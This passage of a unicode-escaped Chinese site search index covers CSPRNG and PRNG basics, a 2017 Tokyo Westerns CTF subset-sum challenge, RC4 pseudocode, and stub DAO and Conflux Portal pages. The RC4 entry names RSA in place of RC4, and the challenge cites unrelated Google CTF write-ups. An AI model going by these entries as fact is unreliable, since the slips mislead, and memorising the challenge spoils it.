\u57fa\u4e8e\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u5982\u5bc6\u6587\u6216\u8005\u54c8\u5e0c\u503c\u3002 \u57fa\u4e8e\u6570\u5b66\u96be\u9898 \u67d0\u4e9b\u7279\u6b8a\u76ee\u7684\u7684\u8bbe\u8ba1 \u53c2\u8003\u6587\u732e \u00b6 https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator","title":"\u5bc6\u7801\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668"},{"location":"crypto/streamcipher/prng/csprng/#_1","text":"","title":"\u5bc6\u7801\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668"},{"location":"crypto/streamcipher/prng/csprng/#_2","text":"\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08cryptographically secure pseudo-random number generator\uff0cCSPRNG\uff09\uff0c\u4e5f\u79f0\u4e3a\u5bc6\u7801\u5b66\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08cryptographic pseudo-random number generator\uff0cCPRNG\uff09\uff0c\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u3002\u5b83\u9700\u8981\u6ee1\u8db3\u6ee1\u8db3\u4e00\u4e9b\u5fc5\u8981\u7684\u7279\u6027\uff0c\u4ee5\u4fbf\u4e8e\u9002\u5408\u4e8e\u5bc6\u7801\u5b66\u5e94\u7528\u3002 \u5bc6\u7801\u5b66\u7684\u5f88\u591a\u65b9\u9762\u90fd\u9700\u8981\u968f\u673a\u6570 \u5bc6\u94a5\u751f\u6210 \u751f\u6210\u521d\u59cb\u5316\u5411\u91cf\uff0cIV\uff0c\u7528\u4e8e\u5206\u7ec4\u5bc6\u7801\u7684 CBC\uff0cCFB\uff0cOFB \u6a21\u5f0f nounce\uff0c\u7528\u4e8e\u9632\u6b62\u91cd\u653e\u653b\u51fb\u4ee5\u53ca\u5206\u7ec4\u5bc6\u7801\u7684 CTR \u6a21\u5f0f\u7b49\u3001 one-time pads \u67d0\u4e9b\u7b7e\u540d\u65b9\u6848\u4e2d\u7684\u76d0\uff0c\u5982 ECDSA \uff0c RSASSA-PSS","title":"\u4ecb\u7ecd"},{"location":"crypto/streamcipher/prng/csprng/#_3","text":"\u6beb\u65e0\u7591\u95ee\uff0c\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u8981\u6c42\u80af\u5b9a\u6bd4\u4e00\u822c\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u8981\u9ad8\u3002\u4e00\u822c\u800c\u8a00\uff0cCSPRNG \u7684\u8981\u6c42\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b \u901a\u8fc7\u7edf\u8ba1\u968f\u673a\u6027\u6d4b\u8bd5\u3002CSPRNG \u5fc5\u987b\u901a\u8fc7 next-bit test \uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u77e5\u9053\u4e86\u4e00\u4e2a\u5e8f\u5217\u7684\u524d k \u4e2a\u6bd4\u7279\uff0c\u653b\u51fb\u8005\u4e0d\u53ef\u80fd\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u4ee5\u5927\u4e8e 50% \u7684\u6982\u7387\u9884\u6d4b\u51fa\u6765\u4e0b\u4e00\u4e2a\u6bd4\u7279\u4f4d\u3002\u8fd9\u91cc\u7279\u522b\u63d0\u53ca\u4e00\u70b9\uff0c\u59da\u671f\u667a\u66fe\u5728 1982 \u5e74\u8bc1\u660e\uff0c\u5982\u679c\u4e00\u4e2a\u751f\u6210\u5668\u53ef\u4ee5\u901a\u8fc7 next-bit test \uff0c\u90a3\u4e48\u5b83\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6240\u6709\u5176\u4ed6\u7684\u591a\u9879\u5f0f\u65f6\u95f4\u7edf\u8ba1\u6d4b\u8bd5\u3002 \u5fc5\u987b\u80fd\u591f\u62b5\u6297\u8db3\u591f\u5f3a\u7684\u653b\u51fb\uff0c\u6bd4\u5982\u5f53\u751f\u6210\u5668\u7684\u90e8\u5206\u521d\u59cb\u72b6\u6001\u6216\u8005\u8fd0\u884c\u65f6\u7684\u72b6\u6001\u88ab\u653b\u51fb\u8005\u83b7\u77e5\u65f6\uff0c\u653b\u51fb\u8005\u4ecd\u7136\u4e0d\u80fd\u591f\u83b7\u53d6\u6cc4\u6f0f\u72b6\u6001\u4e4b\u524d\u7684\u751f\u6210\u7684\u968f\u673a\u6570\u3002","title":"\u9700\u6c42"},{"location":"crypto/streamcipher/prng/csprng/#_4","text":"\u5c31\u76ee\u524d\u800c\u770b\uff0c CSPRNG \u7684\u8bbe\u8ba1\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e09\u7c7b \u57fa\u4e8e\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u5982\u5bc6\u6587\u6216\u8005\u54c8\u5e0c\u503c\u3002 \u57fa\u4e8e\u6570\u5b66\u96be\u9898 \u67d0\u4e9b\u7279\u6b8a\u76ee\u7684\u7684\u8bbe\u8ba1","title":"\u5206\u7c7b"},{"location":"crypto/streamcipher/prng/csprng/#_5","text":"https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/streamcipher/prng/intro/","text":"\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4ecb\u7ecd \u00b6 \u6982\u8ff0 \u00b6 \u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08pseudorandom number generator\uff0cPRNG\uff09\uff0c\u53c8\u79f0\u4e3a\u786e\u5b9a\u6027\u968f\u673a\u4f4d\u751f\u6210\u5668\uff08deterministic random bit generator\uff0cDRBG\uff09\uff0c\u662f\u7528\u6765\u751f\u6210 \u63a5\u8fd1\u4e8e\u7edd\u5bf9\u968f\u673a\u6570\u5e8f\u5217\u7684\u6570\u5b57\u5e8f\u5217 \u7684\u7b97\u6cd5\u3002\u4e00\u822c\u6765\u8bf4\uff0cPRNG \u4f1a\u4f9d\u8d56\u4e8e\u4e00\u4e2a\u521d\u59cb\u503c\uff0c\u4e5f\u79f0\u4e3a\u79cd\u5b50\uff0c\u6765\u751f\u6210\u5bf9\u5e94\u7684\u4f2a\u968f\u673a\u6570\u5e8f\u5217\u3002\u53ea\u8981\u79cd\u5b50\u786e\u5b9a\u4e86\uff0cPRNG \u6240\u751f\u6210\u7684\u968f\u673a\u6570\u5c31\u662f\u5b8c\u5168\u786e\u5b9a\u7684\uff0c\u56e0\u6b64\u5176\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u5e76\u4e0d\u662f\u771f\u6b63\u968f\u673a\u7684\u3002 \u5c31\u76ee\u524d\u800c\u8a00\uff0cPRNG \u5728\u4f17\u591a\u5e94\u7528\u90fd\u53d1\u6325\u7740\u91cd\u8981\u7684\u4f5c\u7528\uff0c\u6bd4\u5982\u6a21\u62df\uff08\u8499\u7279\u5361\u6d1b\u65b9\u6cd5\uff09\uff0c\u7535\u5b50\u7ade\u6280\uff0c\u5bc6\u7801\u5e94\u7528\u3002 \u968f\u673a\u6027\u7684\u4e25\u683c\u6027 \u00b6 \u968f\u673a\u6027\uff1a\u968f\u673a\u6570\u5e94\u8be5\u4e0d\u5b58\u5728\u7edf\u8ba1\u5b66\u504f\u5dee\uff0c\u662f\u5b8c\u5168\u6742\u4e71\u7684\u6570\u5217\u3002 \u4e0d\u53ef\u9884\u6d4b\u6027\uff1a\u4e0d\u80fd\u4ece\u8fc7\u53bb\u7684\u5e8f\u5217\u63a8\u6d4b\u51fa\u4e0b\u4e00\u4e2a\u51fa\u73b0\u7684\u6570\u3002 \u4e0d\u53ef\u91cd\u73b0\u6027\uff1a\u9664\u975e\u6570\u5217\u4fdd\u5b58\u4e0b\u6765\uff0c\u5426\u5219\u4e0d\u80fd\u91cd\u73b0\u76f8\u540c\u7684\u6570\u5217\u3002 \u8fd9\u4e09\u4e2a\u6027\u8d28\u7684\u4e25\u683c\u6027\u4f9d\u6b21\u9012\u589e\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u968f\u673a\u6570\u53ef\u4ee5\u5206\u4e3a\u4e09\u7c7b \u7c7b\u522b \u968f\u673a\u6027 \u4e0d\u53ef\u9884\u6d4b\u6027 \u4e0d\u53ef\u91cd\u73b0\u6027 \u5f31\u4f2a\u968f\u673a\u6570 \u2705 \u274c \u274c \u5f3a\u4f2a\u968f\u673a\u6570 \u2705 \u2705 \u274c \u771f\u968f\u673a\u6570 \u2705 \u2705 \u2705 \u4e00\u822c\u6765\u8bf4\uff0c\u5bc6\u7801\u5b66\u4e2d\u4f7f\u7528\u7684\u968f\u673a\u6570\u662f\u7b2c\u4e8c\u79cd\u3002 \u5468\u671f \u00b6 \u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c\u4e00\u65e6 PRNG \u6240\u4f9d\u8d56\u7684\u79cd\u5b50\u786e\u5b9a\u4e86\uff0c\u90a3\u4e48 PRNG \u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u57fa\u672c\u4e5f\u5c31\u786e\u5b9a\u4e86\u3002\u8fd9\u91cc\u5b9a\u4e49 PRNG \u7684\u5468\u671f\u5982\u4e0b\uff1a\u5bf9\u4e8e\u4e00\u4e2a PRNG \u7684 \u6240\u6709\u53ef\u80fd\u8d77\u59cb\u72b6\u6001 \uff0c\u4e0d\u91cd\u590d\u5e8f\u5217\u7684\u6700\u957f\u957f\u5ea6\u3002\u663e\u7136\uff0c\u5bf9\u4e8e\u4e00\u4e2a PRNG \u6765\u8bf4\uff0c\u5176\u5468\u671f\u4e0d\u4f1a\u5927\u4e8e\u5176\u6240\u6709\u53ef\u80fd\u7684\u72b6\u6001\u3002\u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u5f53\u6211\u4eec\u9047\u5230\u91cd\u590d\u7684\u8f93\u51fa\u65f6\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u662f PRNG \u7684\u5468\u671f\uff0c\u56e0\u4e3a PRNG \u7684\u72b6\u6001\u4e00\u822c\u90fd\u662f\u5927\u4e8e\u8f93\u51fa\u7684\u4f4d\u6570\u7684\u3002 \u8bc4\u4ef7\u6807\u51c6 \u00b6 \u53c2\u89c1\u7ef4\u57fa\u767e\u79d1\uff0c https://en.wikipedia.org/wiki/Pseudorandom_number_generator \u3002 \u5206\u7c7b \u00b6 \u76ee\u524d\u901a\u7528\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4e3b\u8981\u6709 \u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668\uff0cLCG \u7ebf\u6027\u56de\u5f52\u53d1\u751f\u5668 Mersenne Twister xorshift generators WELL family of generators Linear feedback shift register\uff0cLFSR\uff0c\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668 \u95ee\u9898 \u00b6 \u901a\u5e38\u6765\u8bf4\uff0c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u53ef\u80fd\u4f1a\u6709\u4ee5\u4e0b\u95ee\u9898 \u5728\u67d0\u4e9b\u79cd\u5b50\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u7684\u5468\u671f\u4f1a\u6bd4\u8f83\u5c0f\u3002 \u751f\u6210\u5927\u6570\u65f6\uff0c\u5206\u914d\u7684\u4e0d\u5747\u5300\u3002 \u8fde\u7eed\u503c\u4e4b\u95f4\u5173\u8054\u5bc6\u5207\uff0c\u77e5\u9053\u540e\u7eed\u503c\uff0c\u53ef\u4ee5\u77e5\u9053\u4e4b\u524d\u7684\u503c\u3002 \u8f93\u51fa\u5e8f\u5217\u7684\u503c\u7684\u5927\u5c0f\u5f88\u4e0d\u5747\u5300\u3002 \u53c2\u8003 \u00b6 https://en.wikipedia.org/wiki/Pseudorandom_number_generator","title":"\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4ecb\u7ecd"},{"location":"crypto/streamcipher/prng/intro/#_1","text":"","title":"\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4ecb\u7ecd"},{"location":"crypto/streamcipher/prng/intro/#_2","text":"\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08pseudorandom number generator\uff0cPRNG\uff09\uff0c\u53c8\u79f0\u4e3a\u786e\u5b9a\u6027\u968f\u673a\u4f4d\u751f\u6210\u5668\uff08deterministic random bit generator\uff0cDRBG\uff09\uff0c\u662f\u7528\u6765\u751f\u6210 \u63a5\u8fd1\u4e8e\u7edd\u5bf9\u968f\u673a\u6570\u5e8f\u5217\u7684\u6570\u5b57\u5e8f\u5217 \u7684\u7b97\u6cd5\u3002\u4e00\u822c\u6765\u8bf4\uff0cPRNG \u4f1a\u4f9d\u8d56\u4e8e\u4e00\u4e2a\u521d\u59cb\u503c\uff0c\u4e5f\u79f0\u4e3a\u79cd\u5b50\uff0c\u6765\u751f\u6210\u5bf9\u5e94\u7684\u4f2a\u968f\u673a\u6570\u5e8f\u5217\u3002\u53ea\u8981\u79cd\u5b50\u786e\u5b9a\u4e86\uff0cPRNG \u6240\u751f\u6210\u7684\u968f\u673a\u6570\u5c31\u662f\u5b8c\u5168\u786e\u5b9a\u7684\uff0c\u56e0\u6b64\u5176\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u5e76\u4e0d\u662f\u771f\u6b63\u968f\u673a\u7684\u3002 \u5c31\u76ee\u524d\u800c\u8a00\uff0cPRNG \u5728\u4f17\u591a\u5e94\u7528\u90fd\u53d1\u6325\u7740\u91cd\u8981\u7684\u4f5c\u7528\uff0c\u6bd4\u5982\u6a21\u62df\uff08\u8499\u7279\u5361\u6d1b\u65b9\u6cd5\uff09\uff0c\u7535\u5b50\u7ade\u6280\uff0c\u5bc6\u7801\u5e94\u7528\u3002","title":"\u6982\u8ff0"},{"location":"crypto/streamcipher/prng/intro/#_3","text":"\u968f\u673a\u6027\uff1a\u968f\u673a\u6570\u5e94\u8be5\u4e0d\u5b58\u5728\u7edf\u8ba1\u5b66\u504f\u5dee\uff0c\u662f\u5b8c\u5168\u6742\u4e71\u7684\u6570\u5217\u3002 \u4e0d\u53ef\u9884\u6d4b\u6027\uff1a\u4e0d\u80fd\u4ece\u8fc7\u53bb\u7684\u5e8f\u5217\u63a8\u6d4b\u51fa\u4e0b\u4e00\u4e2a\u51fa\u73b0\u7684\u6570\u3002 \u4e0d\u53ef\u91cd\u73b0\u6027\uff1a\u9664\u975e\u6570\u5217\u4fdd\u5b58\u4e0b\u6765\uff0c\u5426\u5219\u4e0d\u80fd\u91cd\u73b0\u76f8\u540c\u7684\u6570\u5217\u3002 \u8fd9\u4e09\u4e2a\u6027\u8d28\u7684\u4e25\u683c\u6027\u4f9d\u6b21\u9012\u589e\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u968f\u673a\u6570\u53ef\u4ee5\u5206\u4e3a\u4e09\u7c7b \u7c7b\u522b \u968f\u673a\u6027 \u4e0d\u53ef\u9884\u6d4b\u6027 \u4e0d\u53ef\u91cd\u73b0\u6027 \u5f31\u4f2a\u968f\u673a\u6570 \u2705 \u274c \u274c \u5f3a\u4f2a\u968f\u673a\u6570 \u2705 \u2705 \u274c \u771f\u968f\u673a\u6570 \u2705 \u2705 \u2705 \u4e00\u822c\u6765\u8bf4\uff0c\u5bc6\u7801\u5b66\u4e2d\u4f7f\u7528\u7684\u968f\u673a\u6570\u662f\u7b2c\u4e8c\u79cd\u3002","title":"\u968f\u673a\u6027\u7684\u4e25\u683c\u6027"},{"location":"crypto/streamcipher/prng/intro/#_4","text":"\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c\u4e00\u65e6 PRNG \u6240\u4f9d\u8d56\u7684\u79cd\u5b50\u786e\u5b9a\u4e86\uff0c\u90a3\u4e48 PRNG \u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u57fa\u672c\u4e5f\u5c31\u786e\u5b9a\u4e86\u3002\u8fd9\u91cc\u5b9a\u4e49 PRNG \u7684\u5468\u671f\u5982\u4e0b\uff1a\u5bf9\u4e8e\u4e00\u4e2a PRNG \u7684 \u6240\u6709\u53ef\u80fd\u8d77\u59cb\u72b6\u6001 \uff0c\u4e0d\u91cd\u590d\u5e8f\u5217\u7684\u6700\u957f\u957f\u5ea6\u3002\u663e\u7136\uff0c\u5bf9\u4e8e\u4e00\u4e2a PRNG \u6765\u8bf4\uff0c\u5176\u5468\u671f\u4e0d\u4f1a\u5927\u4e8e\u5176\u6240\u6709\u53ef\u80fd\u7684\u72b6\u6001\u3002\u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u5f53\u6211\u4eec\u9047\u5230\u91cd\u590d\u7684\u8f93\u51fa\u65f6\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u662f PRNG \u7684\u5468\u671f\uff0c\u56e0\u4e3a PRNG \u7684\u72b6\u6001\u4e00\u822c\u90fd\u662f\u5927\u4e8e\u8f93\u51fa\u7684\u4f4d\u6570\u7684\u3002","title":"\u5468\u671f"},{"location":"crypto/streamcipher/prng/intro/#_5","text":"\u53c2\u89c1\u7ef4\u57fa\u767e\u79d1\uff0c https://en.wikipedia.org/wiki/Pseudorandom_number_generator \u3002","title":"\u8bc4\u4ef7\u6807\u51c6"},{"location":"crypto/streamcipher/prng/intro/#_6","text":"\u76ee\u524d\u901a\u7528\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4e3b\u8981\u6709 \u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668\uff0cLCG \u7ebf\u6027\u56de\u5f52\u53d1\u751f\u5668 Mersenne Twister xorshift generators WELL family of generators Linear feedback shift register\uff0cLFSR\uff0c\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668","title":"\u5206\u7c7b"},{"location":"crypto/streamcipher/prng/intro/#_7","text":"\u901a\u5e38\u6765\u8bf4\uff0c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u53ef\u80fd\u4f1a\u6709\u4ee5\u4e0b\u95ee\u9898 \u5728\u67d0\u4e9b\u79cd\u5b50\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u7684\u5468\u671f\u4f1a\u6bd4\u8f83\u5c0f\u3002 \u751f\u6210\u5927\u6570\u65f6\uff0c\u5206\u914d\u7684\u4e0d\u5747\u5300\u3002 \u8fde\u7eed\u503c\u4e4b\u95f4\u5173\u8054\u5bc6\u5207\uff0c\u77e5\u9053\u540e\u7eed\u503c\uff0c\u53ef\u4ee5\u77e5\u9053\u4e4b\u524d\u7684\u503c\u3002 \u8f93\u51fa\u5e8f\u5217\u7684\u503c\u7684\u5927\u5c0f\u5f88\u4e0d\u5747\u5300\u3002","title":"\u95ee\u9898"},{"location":"crypto/streamcipher/prng/intro/#_8","text":"https://en.wikipedia.org/wiki/Pseudorandom_number_generator","title":"\u53c2\u8003"},{"location":"crypto/streamcipher/prng/problem/","text":"\u9898\u76ee \u00b6 2017 Tokyo Westerns CTF 3 rd Backpacker's Problem \u00b6 \u9898\u76ee\u4e2d\u7ed9\u4e86\u4e00\u4e2a cpp \u6587\u4ef6\uff0c\u5927\u6982\u610f\u601d\u5982\u4e0b Given the integers a_1, a_2, ..., a_N, your task is to find a subsequence b of a where b_1 + b_2 + ... + b_K = 0. Input Format: N a_1 a_2 ... a_N Answer Format: K b_1 b_2 ... b_K Example Input: 4 -8 -2 3 5 Example Answer: 3 -8 3 5 \u5373\u662f\u4e00\u4e2a\u80cc\u5305\u95ee\u9898\u3002\u5176\u4e2d\uff0c\u5728\u672c\u9898\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u89e3\u51b3 20 \u4e2a\u8fd9\u6837\u7684\u80cc\u5305\u95ee\u9898\uff0c\u80cc\u5305\u5927\u5c0f\u4f9d\u6b21\u662f 1 * 10~20 * 10\u3002\u800c\u5b50\u96c6\u6c42\u548c\u7684\u80cc\u5305\u95ee\u9898\u662f\u4e00\u4e2a NPC \u95ee\u9898\uff0c\u95ee\u9898\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u968f\u7740\u968f\u7740\u80cc\u5305\u5927\u5c0f\u800c\u6307\u6570\u589e\u957f\u3002\u8fd9\u91cc\u80cc\u5305\u7684\u5927\u5c0f\u6700\u5927\u662f200\uff0c\u663e\u7136\u4e0d\u53ef\u80fd\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u7684\u65b9\u5f0f\u3002 \u5f85\u5b8c\u6210 \u53c2\u8003\u6587\u732e \u00b6 https://github.com/r00ta/myWriteUps/tree/master/GoogleCTF/woodman http://mslc.ctf.su/wp/google-ctf-woodman-crypto-100/","title":"\u9898\u76ee"},{"location":"crypto/streamcipher/prng/problem/#_1","text":"","title":"\u9898\u76ee"},{"location":"crypto/streamcipher/prng/problem/#2017-tokyo-westerns-ctf-3rd-backpackers-problem","text":"\u9898\u76ee\u4e2d\u7ed9\u4e86\u4e00\u4e2a cpp \u6587\u4ef6\uff0c\u5927\u6982\u610f\u601d\u5982\u4e0b Given the integers a_1, a_2, ..., a_N, your task is to find a subsequence b of a where b_1 + b_2 + ... + b_K = 0. Input Format: N a_1 a_2 ... a_N Answer Format: K b_1 b_2 ... b_K Example Input: 4 -8 -2 3 5 Example Answer: 3 -8 3 5 \u5373\u662f\u4e00\u4e2a\u80cc\u5305\u95ee\u9898\u3002\u5176\u4e2d\uff0c\u5728\u672c\u9898\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u89e3\u51b3 20 \u4e2a\u8fd9\u6837\u7684\u80cc\u5305\u95ee\u9898\uff0c\u80cc\u5305\u5927\u5c0f\u4f9d\u6b21\u662f 1 * 10~20 * 10\u3002\u800c\u5b50\u96c6\u6c42\u548c\u7684\u80cc\u5305\u95ee\u9898\u662f\u4e00\u4e2a NPC \u95ee\u9898\uff0c\u95ee\u9898\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u968f\u7740\u968f\u7740\u80cc\u5305\u5927\u5c0f\u800c\u6307\u6570\u589e\u957f\u3002\u8fd9\u91cc\u80cc\u5305\u7684\u5927\u5c0f\u6700\u5927\u662f200\uff0c\u663e\u7136\u4e0d\u53ef\u80fd\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u7684\u65b9\u5f0f\u3002 \u5f85\u5b8c\u6210","title":"2017 Tokyo Westerns CTF 3rd Backpacker's Problem"},{"location":"crypto/streamcipher/prng/problem/#_2","text":"https://github.com/r00ta/myWriteUps/tree/master/GoogleCTF/woodman http://mslc.ctf.su/wp/google-ctf-woodman-crypto-100/","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/streamcipher/special/rc4/","text":"RC4 \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 RSA \u7531 Ron Rivest \u8bbe\u8ba1\uff0c\u6700\u521d\u96b6\u5c5e\u4e8e RSA \u5b89\u5168\u516c\u53f8\uff0c\u662f\u4e00\u4e2a\u4e13\u5229\u5bc6\u7801\u4ea7\u54c1\u3002\u5b83\u662f\u9762\u5411\u5b57\u8282\u7684\u6d41\u5bc6\u7801\uff0c\u5bc6\u94a5\u957f\u5ea6\u53ef\u53d8\uff0c\u975e\u5e38\u7b80\u5355\uff0c\u4f46\u4e5f\u5f88\u6709\u6548\u679c\u3002RC4 \u7b97\u6cd5\u5e7f\u6cdb\u5e94\u7528\u4e8e SSL/TLS \u534f\u8bae\u548c WEP/WPA \u534f\u8bae\u3002 \u57fa\u672c\u6d41\u7a0b \u00b6 RC4 \u4e3b\u8981\u5305\u542b\u4e09\u4e2a\u6d41\u7a0b \u521d\u59cb\u5316 S \u548c T \u6570\u7ec4\u3002 \u521d\u59cb\u5316\u7f6e\u6362 S\u3002 \u751f\u6210\u5bc6\u94a5\u6d41\u3002 \u521d\u59cb\u5316 S \u548c T \u6570\u7ec4 \u00b6 \u521d\u59cb\u5316 S \u548c T \u7684\u4ee3\u7801\u5982\u4e0b for i = 0 to 255 do S [ i ] = i T [ i ] = K [ i mod keylen ]) \u521d\u59cb\u5316\u7f6e\u6362 S \u00b6 j = 0 for i = 0 to 255 do j = ( j + S [ i ] + T [ i ]) ( mod 256 ) swap ( S [ i ], S [ j ]) \u751f\u6210\u6d41\u5bc6\u94a5 \u00b6 i = j = 0 for each message byte b i = ( i + 1 ) ( mod 256 ) j = ( j + S [ i ]) ( mod 256 ) swap ( S [ i ], S [ j ]) t = ( S [ i ] + S [ j ]) ( mod 256 ) print S [ t ] \u6211\u4eec\u4e00\u822c\u79f0\u524d\u4e24\u90e8\u5206\u4e3a KSA \uff0c\u6700\u540e\u4e00\u90e8\u5206\u662f PRGA\u3002 \u653b\u51fb\u65b9\u6cd5 \u00b6 \u5f85\u8865\u5145\u3002","title":"RC4"},{"location":"crypto/streamcipher/special/rc4/#rc4","text":"","title":"RC4"},{"location":"crypto/streamcipher/special/rc4/#_1","text":"RSA \u7531 Ron Rivest \u8bbe\u8ba1\uff0c\u6700\u521d\u96b6\u5c5e\u4e8e RSA \u5b89\u5168\u516c\u53f8\uff0c\u662f\u4e00\u4e2a\u4e13\u5229\u5bc6\u7801\u4ea7\u54c1\u3002\u5b83\u662f\u9762\u5411\u5b57\u8282\u7684\u6d41\u5bc6\u7801\uff0c\u5bc6\u94a5\u957f\u5ea6\u53ef\u53d8\uff0c\u975e\u5e38\u7b80\u5355\uff0c\u4f46\u4e5f\u5f88\u6709\u6548\u679c\u3002RC4 \u7b97\u6cd5\u5e7f\u6cdb\u5e94\u7528\u4e8e SSL/TLS \u534f\u8bae\u548c WEP/WPA \u534f\u8bae\u3002","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"crypto/streamcipher/special/rc4/#_2","text":"RC4 \u4e3b\u8981\u5305\u542b\u4e09\u4e2a\u6d41\u7a0b \u521d\u59cb\u5316 S \u548c T \u6570\u7ec4\u3002 \u521d\u59cb\u5316\u7f6e\u6362 S\u3002 \u751f\u6210\u5bc6\u94a5\u6d41\u3002","title":"\u57fa\u672c\u6d41\u7a0b"},{"location":"crypto/streamcipher/special/rc4/#s-t","text":"\u521d\u59cb\u5316 S \u548c T \u7684\u4ee3\u7801\u5982\u4e0b for i = 0 to 255 do S [ i ] = i T [ i ] = K [ i mod keylen ])","title":"\u521d\u59cb\u5316 S \u548c T \u6570\u7ec4"},{"location":"crypto/streamcipher/special/rc4/#s","text":"j = 0 for i = 0 to 255 do j = ( j + S [ i ] + T [ i ]) ( mod 256 ) swap ( S [ i ], S [ j ])","title":"\u521d\u59cb\u5316\u7f6e\u6362 S"},{"location":"crypto/streamcipher/special/rc4/#_3","text":"i = j = 0 for each message byte b i = ( i + 1 ) ( mod 256 ) j = ( j + S [ i ]) ( mod 256 ) swap ( S [ i ], S [ j ]) t = ( S [ i ] + S [ j ]) ( mod 256 ) print S [ t ] \u6211\u4eec\u4e00\u822c\u79f0\u524d\u4e24\u90e8\u5206\u4e3a KSA \uff0c\u6700\u540e\u4e00\u90e8\u5206\u662f PRGA\u3002","title":"\u751f\u6210\u6d41\u5bc6\u94a5"},{"location":"crypto/streamcipher/special/rc4/#_4","text":"\u5f85\u8865\u5145\u3002","title":"\u653b\u51fb\u65b9\u6cd5"},{"location":"dao/introduction/","text":"DAO \u00b6 \u53bb\u4e2d\u5fc3\u5316\u6cbb\u7406\u3002 \u4f55\u4e3aDAO \u00b6 DAO\u53efDAO\uff0c\u975e\u5e38\u9053\u3002","title":"DAO"},{"location":"dao/introduction/#dao","text":"\u53bb\u4e2d\u5fc3\u5316\u6cbb\u7406\u3002","title":"DAO"},{"location":"dao/introduction/#dao_1","text":"DAO\u53efDAO\uff0c\u975e\u5e38\u9053\u3002","title":"\u4f55\u4e3aDAO"},{"location":"development/add-token-to-portal/","text":"\u6dfb\u52a0CRC20\u4ee3\u5e01\u5230Portal\u7684\u65b9\u6cd5\u4e0e\u6b65\u9aa4 \u00b6 \u80cc\u666f \u00b6 \u5728\u65e5\u5e38\u4f7f\u7528 Conflux Portal \u65f6\uff0c\u53ef\u80fd\u9700\u8981\u5411\u4ed6\u4eba\u8f6c\u8d26CRC20\u4ee3\u5e01\u6216LP\u5e01\u5bf9\uff0c\u4f46\u662fConflux Portal\u5728\u521d\u59cb\u5b89\u88c5\u72b6\u6001\u65f6\uff0c\u9664 CFX \u5916\u4e0d\u4f1a\u5728\u5176\u4ee3\u5e01\u5217\u8868\u5185\u5305\u542b\u4efb\u4f55CRC20\u4ee3\u5e01\u3002\u672c\u6559\u7a0b\u76ee\u7684\u662f\u5e2e\u52a9\u7528\u6237\u80fd\u591f\u5229\u7528Conflux Portal\u7684\u6dfb\u52a0\u4ee3\u5e01\u529f\u80fd\u5c06\u4ee3\u5e01\u52a0\u5165\u5176Portal\u5217\u8868\u3002 \u4e24\u79cd\u6dfb\u52a0\u65b9\u6cd5 \u00b6 \u57fa\u4e8eConflux Portal\u4ee3\u5e01\u641c\u7d22\u6846\u7684\u6dfb\u52a0\u65b9\u6cd5\uff1a \u6dfb\u52a0\u5df2\u63a5\u5165\u4ee3\u5e01\u65f6\u5e38\u7528 \u57fa\u4e8e\u667a\u80fd\u5408\u7ea6\u5730\u5740\u7684\u6dfb\u52a0\u65b9\u6cd5\uff1a 